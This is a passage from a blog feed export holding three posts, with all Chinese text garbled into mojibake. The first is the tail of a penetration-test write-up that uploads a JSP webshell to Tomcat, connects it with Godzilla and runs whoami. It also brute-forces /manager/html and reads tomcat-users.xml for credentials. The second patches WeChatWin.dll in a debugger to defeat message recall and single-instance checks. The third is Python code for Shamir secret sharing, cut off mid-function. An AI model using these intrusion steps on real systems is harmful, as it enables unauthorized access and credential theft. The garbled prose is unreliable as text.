ä¹Ÿçœ‹åˆ°ç¡®å®å­˜åœ¨ï¼Œä½†è¿™é‡Œæ²¡æ³•æ“ä½œï¼Œåªå¥½ä½œç½¢</p><p><img src="https://img.tucang.cc/api/image/show/999a058084b7703576f84f514965b2eb" alt="image-20230412184947048"></p><h2 id="Druid-æœªæˆæƒ"><a href="#Druid-æœªæˆæƒ" class="headerlink" title="Druid æœªæˆæƒ"></a>Druid æœªæˆæƒ</h2><p>å°±å½“è¦æ”¾å¼ƒçš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ª <code>Druid æœªæˆæƒ</code>ï¼Œå¯è°“æ˜¯æ•‘å‘½ç¨»è‰ï¼Œç°åœ¨å°±ç¼ºä¸€ä¸ªè·¯å¾„ï¼ŒçœŸæ˜¯é€åˆ°å˜´è¾¹äº†</p><p><img src="https://img.tucang.cc/api/image/show/ea6f3f684a4731f6a6bf0e211ba348c2" alt="image-20230412185141640"></p><h2 id="é»˜è®¤é¡µé¢æœªåˆ é™¤"><a href="#é»˜è®¤é¡µé¢æœªåˆ é™¤" class="headerlink" title="é»˜è®¤é¡µé¢æœªåˆ é™¤"></a>é»˜è®¤é¡µé¢æœªåˆ é™¤</h2><p>åŒæ—¶ <code>dirsearch</code> æ”¶é›†ä¿¡æ¯çš„æ—¶å€™ï¼Œä¹Ÿå‘ç°äº†é»˜è®¤é¡µé¢ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/4fd06fe2e31f93d9e0e7aea1ecc461d5" alt="image-20230412185238598"></p><p>çœŸçš„æ˜¯éå¸¸è´´å¿ƒäº†</p><p><img src="https://img.tucang.cc/api/image/show/b89b1a5cc347484ee605b72a91287c2d" alt="image-20230412185327670"></p><p>æ€•æˆ‘çœ‹ä¸æ‡‚ï¼Œè¿˜ç»™æˆ‘è§£é‡Šäº†ï¼š</p><blockquote><p>where â€œ$CATALINA_HOMEâ€ is the root of the Tomcat installation directory.</p></blockquote><h2 id="ç»§ç»­å†™ğŸ"><a href="#ç»§ç»­å†™ğŸ" class="headerlink" title="ç»§ç»­å†™ğŸ"></a>ç»§ç»­å†™ğŸ</h2><p>ç›´æ¥ç”¨è·¯å¾„æ‹¼æ¥ï¼Œä¼ ä¸€ä¸ª hello ä¸Šå»</p><p><img src="https://img.tucang.cc/api/image/show/dd7ba1ab43d6b56019cee457093b33cf" alt="image-20230412185733751"></p><p>æˆåŠŸ hello</p><p><img src="https://img.tucang.cc/api/image/show/80ae4e9ffd0fdd099124d29d0baf80b3" alt="image-20230412185813134"></p><h2 id="ä¸Šçº¿"><a href="#ä¸Šçº¿" class="headerlink" title="ä¸Šçº¿"></a>ä¸Šçº¿</h2><p>ç›´æ¥ä¸Šé©¬ï¼ˆè¿™é‡Œä¸€ç›´åœ¨è°ƒè¯•ï¼Œä» <code>1.jsp</code> è¿­ä»£åˆ° <code>6.jsp</code> äº†ï¼‰</p><p><img src="https://img.tucang.cc/api/image/show/59635ab512f922d0f7ce00504567bb2a" alt="image-20230412185858078"></p><p>å“¥æ–¯æ‹‰ä¸Šçº¿</p><p><img src="https://img.tucang.cc/api/image/show/94f7dbfb2715705e3a8e2f5eebf70e61" alt="image-20230412190111914"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55b63ead9084d03ab1510957ec423724" alt="image-20230412190139502"></p><h2 id="x2F-manager-x2F-html"><a href="#x2F-manager-x2F-html" class="headerlink" title="&#x2F;manager&#x2F;html"></a>&#x2F;manager&#x2F;html</h2><p>å¦å¤–ä¹Ÿæ‰¾åˆ° <code>xxxx:8080/manager/html</code> äº†ï¼Œæ‹¿ <code>msf</code> è¿›è¡Œäº†ä¸€æ¬¡å¸¸è§„é»˜è®¤å¯†ç çˆ†ç ´ï¼Œå¹¶æ²¡æœ‰çˆ†å‡º</p><p>åæ¥æ‹¿åˆ°ç‰©ç†è·¯å¾„ä¹Ÿåˆšå¥½è¯»ä¸€ä¸‹<code>xxxxx/conf/tomcat-users.xml</code></p><p><img src="https://img.tucang.cc/api/image/show/76e43b161928a96474abb162bda578de" alt="image-20230412185534061"></p><p>ä½†å¯†ç è¿˜æ˜¯ä¸æ­£ç¡®ï¼Œè¿™ä¸ªç‚¹æ²¡æ³•ç”¨</p><p><img src="https://img.tucang.cc/api/image/show/828e847b3da51385fc9f40eefcb79e64" alt="image-20230412190750048"></p><p>å› ä¸ºæœ¬èº«å°±æ˜¯æµ‹çš„å†…ç½‘ç³»ç»Ÿï¼Œå°±ä¸åšå†…ç½‘æ¸—é€äº†ï¼ˆä¸æ˜¯å› ä¸ºä¸ä¼š</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PC ç«¯å¾®ä¿¡é˜²æ’¤å›ä¸å¤šå¼€ Patch</title>
    <link href="/2022/12/22/Wechat_revoke/"/>
    <url>/2022/12/22/Wechat_revoke/</url>
    
    <content type="html"><![CDATA[<h1 id="PC-ç«¯å¾®ä¿¡é˜²æ’¤å›ä¸å¤šå¼€-Patch"><a href="#PC-ç«¯å¾®ä¿¡é˜²æ’¤å›ä¸å¤šå¼€-Patch" class="headerlink" title="PC ç«¯å¾®ä¿¡é˜²æ’¤å›ä¸å¤šå¼€ Patch"></a>PC ç«¯å¾®ä¿¡é˜²æ’¤å›ä¸å¤šå¼€ Patch</h1><p>è¿™æ˜¯ä¸€ä¸ªæˆæœå‘æ•™ç¨‹ï¼Œå‚è€ƒäº†ä¸€äº›ç½‘ä¸Šçš„æ•™ç¨‹æ±‡æ€»è€Œæˆã€‚ä»…ç”¨äºæŠ€æœ¯äº¤æµã€‚</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ol><li>æ’¤å›çš„è‹±æ–‡ â€œrecallâ€ã€â€revokeâ€ï¼›å¤šå¼€çŒœæµ‹ç”¨äº† <code>mutex</code></li><li>ç”¨ <code>notepad++</code> å¯¹æ‰€æœ‰æ–‡ä»¶è¿›è¡Œæœç´¢</li><li>å¯¹ç»“æœåˆ†æï¼Œå®šä½åˆ°å…³é”®é€»è¾‘ä½äº <code>WeChatWin.dll</code> æ–‡ä»¶ä¸­</li><li>é™„åŠ åˆ°è¿›ç¨‹</li><li>é€‰æ‹©å¯¹åº”æ¨¡å—</li><li>æœç´¢å…³é”®å­— â€œrevokeâ€</li><li>ä¸‹æ–­ç‚¹</li><li>è°ƒè¯•</li><li>è®°å½•ç‰¹å¾å€¼(æ–¹ä¾¿ä¸‹æ¬¡ä¿®æ”¹)</li></ol><p>é€šè¿‡ç½‘ä¸Šå„ä½å¤§ç‰›çš„ç ”ç©¶ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ä¸€ä¸‹ä¿¡æ¯ï¼š</p><ul><li>æ’¤å›ã€é™åˆ¶å¤šå¼€çš„é€»è¾‘éƒ½ä½äº <code>WeChatWin.dll</code> æ–‡ä»¶ä¸­</li><li>æ’¤å›ç›¸å…³çš„å…³é”®è¯ <code>revokemsg</code></li><li>å¤šå¼€ç›¸å…³çš„å…³é”®è¯ <code>WeChat_App_Instance_Identity_Mutex_Name</code></li></ul><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ul><li><a href="https://down.52pojie.cn/Tools/Debuggers/x64dbg_2019_07_02.zip">x32dbg</a></li></ul><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ç™»å½•å¾®ä¿¡ï¼Œè¿™é‡Œç™»å°å·æµ‹è¯•</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/20997/30/20053/21701/63b1abb5F918b46d4/88547752797801d6.png" alt="image-20221222151758533" style="zoom:50%;" /><p>æ‰“å¼€ <code>x32dbg</code>ï¼Œå°†å¾®ä¿¡è¿›ç¨‹é™„åŠ è¿›å»</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/169006/39/33577/77381/63b1ac31F8f79d85f/a535c0fb43fef10b.png" alt="image-20221222151830104" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/61127/36/23533/150329/63b1ac3bFe5b04626/d5c81636f991eb9d.png" alt="image-20221222151849988" style="zoom:50%;" /><p>å¾®ä¿¡è¿›ç¨‹å·²ç»é™„åŠ ï¼Œå¾®ä¿¡ä¼šè¿›å…¥å‡æ­»çŠ¶æ€ï¼Œç‚¹ä¸åŠ¨æ˜¯æ­£å¸¸çš„</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/67287/24/23472/798125/63b1ac56F6f51a3e2/2b5715b683543377.png" alt="image-20221222152029216" style="zoom:50%;" /><p>åˆ‡æ¢åˆ°ç¬¦å·é€‰é¡¹å¡ï¼Œåœ¨å·¦ä¸‹è§’æœç´¢ <code>WeChatWin.dll</code> ï¼ŒåŒå‡» <code>wechatwin.dll</code> è¿›å…¥ CPU é€‰é¡¹å¡</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163432/30/33588/560091/63b1ac69F207c8f60/1547ee425e1b47a8.png" alt="image-20221222152103370" style="zoom:50%;" /><p>è¿›å…¥åå³é”® <code>æœç´¢ -&gt; å½“å‰åŒºåŸŸ -&gt; å­—ç¬¦ä¸²</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/125146/22/34140/401028/63b1ac79Fe2eb1674/6e8a58580f904f52.png" alt="image-20221222152156692" style="zoom:50%;" /><h3 id="é˜²æ’¤å›"><a href="#é˜²æ’¤å›" class="headerlink" title="é˜²æ’¤å›"></a>é˜²æ’¤å›</h3><p>ç›´æ¥æœç´¢å…³é”®è¯ <code>revokemsg</code>ï¼Œç„¶ååŒå‡»<strong>ç¬¬ä¸€ä¸ª</strong><code>&quot;revokemsg&quot;</code>è¿›å…¥ (ç«™åœ¨äº†å·¨äººçš„è‚©è†€ä¸Š)</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/30539/22/19502/614117/63b1ac87Fdefcc75b/0ef097a18e6547ff.png" alt="image-20221222153829360" style="zoom:50%;" /><p>è¿›å…¥å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œè¯¥æŒ‡ä»¤ä¸Šä¸€æ¡æ˜¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6EA62DEB</span> | <span class="hljs-number">74</span> <span class="hljs-number">32</span>                    | je wechatwin.<span class="hljs-number">6</span>EA62E1F                   |<br></code></pre></td></tr></table></figure><p><code>je wechatwin.6EA62E1F</code>ï¼Œ<code>je</code> æ˜¯ <code>jump if equal</code>ï¼Œè¿™æ¡æŒ‡ä»¤ä»¥ä¸‹çš„æ¡†æ¡†(å³ <code>0x6ea62deb</code> åœ°å€åˆ° <code>0x6ea62e1f</code> åœ°å€é—´çš„æŒ‡ä»¤)ä¸ºæ’¤å›çš„é€»è¾‘ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129759/12/32342/182416/63b1ac90Fc8ff35e9/69c5e67ff2a80e76.png" alt="image-20221222153905922" style="zoom:50%;" /><p>è·³è¿‡è¯¥é€»è¾‘ï¼Œå°† <code>je</code> æ”¹æˆ <code>jmp</code>ï¼Œç›´æ¥è·³è¿‡ï¼›ä¹Ÿå¯å°† <code>call</code> åˆ æ‰æˆ–ç”¨ <code>nop</code> å¡«å……</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/43380/37/21957/165902/63b1aca4Fc3feaac2/e15e27374e22e182.png" alt="image-20221222154837170" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98659/25/32555/175309/63b1acadFae311236/35d973c7f0b9948b.png" alt="image-20221222154904367" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32783/28/19590/197210/63b1acc8F2e80011f/d51dfebab97d78a9.png" alt="image-20221222154932229" style="zoom:50%;" /><p>åˆ°è¿™æ’¤å›åŠŸèƒ½å°±è¢«æˆ‘ä»¬è·³è¿‡äº†</p><h3 id="å¤šå¼€"><a href="#å¤šå¼€" class="headerlink" title="å¤šå¼€"></a>å¤šå¼€</h3><p>æœç´¢å…³é”®è¯ <code>WeChat_App_Instance_Identity_Mutex_Name</code>ï¼Œç„¶ååŒå‡»<strong>ç¬¬ä¸€ä¸ª</strong><code>L&quot;WeChat_App_Instance_Identity_Mutex_Name&quot;</code>è¿›å…¥</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/87351/13/31426/72016/63b1acd1Fd292e584/80c75f242561ed4b.png" alt="image-20221222155142916" style="zoom:50%;" /><p>éœ€è¦è¿›è¡Œä¿®æ”¹çš„æ˜¯å½“å‰è¡Œçš„ä¸Šé¢ç¬¬ä¸€ä¸ªå‡ºç°çš„ <code>push ebp</code>ï¼Œä¸ºè¯¥ç¨‹åºçš„å…¥å£ï¼Œå¯åŠ¨çš„æ—¶å€™è¿›è¡Œå”¯ä¸€æ€§æ£€æŸ¥</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186661/35/32135/175696/63b1ace7Fdc084b16/4c4639e687b6a65f.png" alt="image-20221222155226614" style="zoom:50%;" /><p>å°† <code>push ebp</code> ä¿®æ”¹ä¸º <code>ret</code> å³å¯ï¼Œå³æŠŠæ£€æŸ¥åªå¼€ä¸€ä¸ªå¾®ä¿¡çš„åŠŸèƒ½ç›´æ¥ <code>return</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/43386/7/19316/157205/63b1ad03F717fdb9d/12142b24907db446.png" alt="image-20221222155427272" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143019/38/32463/142683/63b1ad15Fd4fde8bb/0484a1b8818e5b6a.png" alt="image-20221222155445694" style="zoom:50%;" /><p>åˆ°è¿™é˜²å¤šå¼€ä¹Ÿåšå¥½äº†</p><h2 id="æ‰“-Patch"><a href="#æ‰“-Patch" class="headerlink" title="æ‰“ Patch"></a>æ‰“ Patch</h2><p>ç‚¹å‡»ç”Ÿæˆè¡¥ä¸çš„æŒ‰é’®ï¼Œç„¶åç‚¹å‡»ä¿®è¡¥æ–‡ä»¶å°±å¯ä»¥å¾—åˆ°ä¿®æ”¹åçš„ <code>WeChatWin.dll</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/213488/3/24586/180839/63b1ad33Fc60bcfdb/df2ee240fb6126ca.png" alt="image-20221222155814551" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/73029/22/24772/220668/63b1ad3bF884b3266/f8d8650424b2edab.png" alt="image-20221222160007408" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/14998/1/19080/47538/63b1ad48F9f350930/38aed109e102907f.png" alt="image-20221222160039615" style="zoom:50%;" /><p>æœ€åå°†åŸ <code>WeChatWin.dll</code> å¤‡ä»½ä¸€ä¸‹ï¼Œå†å°†æ‰“è¿‡ Patch çš„æ–‡ä»¶æ›¿æ¢ä¸ºåŸæœ¬çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥å®ç°åŠŸèƒ½äº†</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143461/32/33281/207161/63b1ad4fF4776f3af/901729c47bb01679.png" alt="image-20221222160136879" style="zoom:50%;" /><p>æœ€åçœ‹çœ‹åŠŸèƒ½ï¼š</p><p><strong>é˜²æ’¤å›ï¼š</strong></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/212791/29/24712/20193/63b1ad54Fa587792d/bac827f64aa4c199.png" alt="image-20221222160257871" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/114510/37/33281/10100/63b1ad5bFd022f0c5/68f884159212340d.png" alt="image-20221222160326874" style="zoom:50%;" /><p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/131527/21/32549/36806/63b1afffF07973afe/82d58302a4e4b791.png" alt="image-20230102000819774"></p><p><strong>å¤šå¼€ï¼š</strong></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/11290/5/20866/32757/63b1aef0Fda7788ab/8afdbaa0590643b7.png" alt="image-20221222160744866" style="zoom:50%;" /><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://www.52pojie.cn/thread-901652-1-1.html">https://www.52pojie.cn/thread-901652-1-1.html</a></li><li><a href="https://www.v2ex.com/t/525542">https://www.v2ex.com/t/525542</a></li><li><a href="https://github.com/Sev73n/wechat_win_revokemsg_block">https://github.com/Sev73n/wechat_win_revokemsg_block</a></li><li><a href="https://github.com/huiyadanli/RevokeMsgPatcher/wiki/">https://github.com/huiyadanli/RevokeMsgPatcher/wiki/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shamir (k, n)é—¨é™ç§˜å¯†åˆ†å‘</title>
    <link href="/2020/09/21/Shamir/"/>
    <url>/2020/09/21/Shamir/</url>
    
    <content type="html"><![CDATA[<p>ç§˜å¯†åˆ†å‘æˆ‘åˆ†ä¸ºäº†ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªæ˜¯åˆ†å‘ï¼Œä¸€ä¸ªæ˜¯æ¢å¤ã€‚</p><h3 id="ç§˜å¯†åˆ†å‘"><a href="#ç§˜å¯†åˆ†å‘" class="headerlink" title="ç§˜å¯†åˆ†å‘"></a>ç§˜å¯†åˆ†å‘</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ç¯å¢ƒï¼šWindows 10ï¼ŒPython 3.7.1<br></code></pre></td></tr></table></figure><p>å› ä¸ºkï¼Œnéƒ½æ˜¯æ•´æ•°ï¼Œå› æ­¤è¾“å…¥çš„æ—¶å€™è¿›è¡Œä¸€ä¸‹å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå¯¹äºéœ€è¦åˆ†å‘çš„ç§˜å¯†ï¼Œç¤ºä¾‹æ˜¯æ•´æ•°ï¼Œä½†æœ‰å¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤åˆ©ç”¨ <code>libnum.s2n</code> å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°ï¼Œå†è¿›è¡Œè¿ç®—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">D = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input your secret: &quot;</span>)<br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;How many parts do you want to devide: &quot;</span>))<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Subset: &quot;</span>))<br></code></pre></td></tr></table></figure><p>å¯¹äºç´ æ•° p çš„è·å–ï¼Œæˆ‘ä½¿ç”¨äº† <code>Crypto.Util.number</code> æ¨¡å—ä¸­ <code>getPrime</code> å‡½æ•°ï¼Œå®ƒçš„å‚æ•°å–å†³äº D å’Œ n çš„å­—èŠ‚é•¿åº¦ï¼Œåœ¨pä¸ä¼šå¤ªè¿‡å¤§çš„æƒ…å†µåŒæ—¶ï¼Œä¿è¯ Dã€n&lt;pï¼Œå¹¶åœ¨åé¢åˆ¤æ–­è‹¥p&lt;Dæˆ–nï¼Œé‡æ–°å–å€¼ï¼Œç„¶åç”¨éšæœºæ•°ç”Ÿæˆå¯¹å¤šé¡¹å¼çš„ç³»æ•°è¿›è¡Œèµ‹å€¼ï¼Œæ”¾è¿›ä¸€ä¸ªåˆ—è¡¨é‡Œï¼Œç„¶åå…¬å¼€ p å’Œ kã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printnum</span>(<span class="hljs-params">num</span>): <span class="hljs-comment"># æ‰“å°å¤šé¡¹å¼ï¼Œä¾¿äºè‡ªå·±æŸ¥çœ‹</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(num[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(num)):<br><span class="hljs-keyword">if</span>(i == <span class="hljs-number">1</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+&#x27;</span> + <span class="hljs-built_in">str</span>(num[i]) + <span class="hljs-string">&quot;x&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+&#x27;</span> + <span class="hljs-built_in">str</span>(num[i]) + <span class="hljs-string">&quot;x^&quot;</span> + <span class="hljs-built_in">str</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>()<br><br><br>D = libnum.s2n(D)<br>bit_D = math.log(D, <span class="hljs-number">2</span>)<br>bit_n = math.log(n, <span class="hljs-number">2</span>)<br>bit = <span class="hljs-built_in">max</span>(bit_D, bit_n)<br>p = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">2</span>)<br><span class="hljs-keyword">while</span> p &lt; D <span class="hljs-keyword">or</span> p &lt; n:<br>p = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">2</span>)<br><br>num = [D]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k-<span class="hljs-number">1</span>):<br>num.append(random.randint(<span class="hljs-number">1</span>, p))<br><br>printnum(num)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your Prime:&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Subset:&quot;</span>, k)<br></code></pre></td></tr></table></figure><p>ç„¶åæ±‚å‡ºæ‰€æœ‰çš„ <code>Di</code>ï¼Œå°†å®ƒçš„ <code>i</code> å’Œ <code>Di</code> ä»¥ <code>(x, y)</code> çš„å½¢å¼æ‰“åŒ…å­˜å‚¨è¿›ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">num, x, p</span>): <span class="hljs-comment"># è®¡ç®—æ¯ä¸ªiå¤šé¡¹å¼æ–¹ç¨‹çš„å€¼</span><br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(num)):<br>result += num[i]*(x**i)<br><span class="hljs-keyword">return</span> (x, result % p)<br><br><br>_D = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n+<span class="hljs-number">1</span>):<br>tmp = f(num, i, p)<br>_D.append(tmp)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;D&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(tmp))<br></code></pre></td></tr></table></figure><p>å°†æ¯ä¸€ä¸ª <code>Di</code> è¾“å‡ºï¼Œç”±ç§˜å¯†è¾“å…¥è€…è¿›è¡Œåˆ†å‘ n ä¸ªéƒ¨åˆ†ã€‚</p><p>è¿è¡Œæ•ˆæœï¼š</p><p><code>(k, n) = (3, 6)</code></p><p><img src="https://img.tucang.cc/api/image/show/6bd774ffb9656581baf832f4593bf977" alt="image-20200921203437444"></p><h3 id="ç§˜å¯†æ¢å¤"><a href="#ç§˜å¯†æ¢å¤" class="headerlink" title="ç§˜å¯†æ¢å¤"></a>ç§˜å¯†æ¢å¤</h3><p>é¦–å…ˆè¾“å…¥ kï¼Œç„¶åè¾“å…¥ç´ æ•° pï¼Œæ¥ç€å°† <code>Di</code> çš„å€¼è¾“å…¥è¿›å»ï¼Œä»¥ <code>(x, y)</code> çš„å½¢å¼æ‰“åŒ…å­˜å‚¨è¿›ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">recoverD = []<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to recover your secret&quot;</span>)<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Subset: &quot;</span>))<br>p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Prime: &quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to input your point like x,y&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>x, y = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input point &quot;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;: &quot;</span>).split(<span class="hljs-string">&#x27;,&#x27;</span>))<br>recoverD.append((x, y))<br></code></pre></td></tr></table></figure><p>æ•°æ®è·å–å®Œæ¯•åï¼Œåˆ©ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•è¿›è¡Œè®¡ç®—ï¼Œå°† <code>i</code> å€¼å’Œ <code>Di</code> çš„å€¼åˆ†å¼€å„ä½ä¸€ä¸ªåˆ—è¡¨ï¼Œç„¶åæ¯ä¸€æ¬¡è®¡ç®—æ¯ä¸€ä¸ªå°å—çš„ <code>q(x)</code>ã€‚å¯¹äºå¤šé¡¹å¼çš„è®¡ç®—ï¼Œå½¢å¦‚ <code>(x-1)(x-2) </code>ï¼Œè¿™é‡Œä¸ºäº†å·æ‡’æˆ‘åˆ©ç”¨äº† <code>numpy</code> é‡Œçš„ <code>array</code>ï¼Œå¹¶åˆ©ç”¨å®ƒçš„æ€§è´¨è®¡ç®—å¤šé¡¹å¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">l</span>(<span class="hljs-params">D</span>): <span class="hljs-comment"># æ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•</span><br>x_s, y_s = <span class="hljs-built_in">zip</span>(*D)<br>lst = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x_s)):<br>others = <span class="hljs-built_in">list</span>(x_s)<br>cur = others.pop(i)<br>dxs = cal(cur, others)<br>fm = fm_cal(cur, others)<br><br>lst.append((dxs, fm))<br><br><span class="hljs-keyword">return</span> lst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, others</span>): <span class="hljs-comment"># è®¡ç®—å¤šé¡¹å¼ï¼Œå³åˆ†å­</span><br>re = np.array([<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> others:<br>p = np.array([<span class="hljs-number">1</span>, -i])<br>re = np.convolve(re, p)<br><br><span class="hljs-keyword">return</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fm_cal</span>(<span class="hljs-params">x, others</span>): 